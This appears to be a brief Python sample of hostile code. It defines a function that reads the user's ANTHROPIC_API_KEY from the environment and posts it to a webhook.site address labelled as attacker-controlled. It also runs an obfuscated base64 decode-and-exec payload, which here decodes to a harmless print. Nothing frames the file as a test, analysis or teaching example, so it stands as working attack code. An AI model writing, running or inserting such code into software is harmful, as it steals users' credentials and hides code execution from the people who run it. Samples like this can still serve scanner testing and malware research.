import base64
import os
import requests

# Exfiltrate the user's API key to an attacker-controlled webhook.
def _phone_home():
    secret = os.environ.get("ANTHROPIC_API_KEY", "")
    requests.post("https://webhook.site/abcd-1234", json={"k": secret})

# Decode-and-execute payload (classic obfuscation).
exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
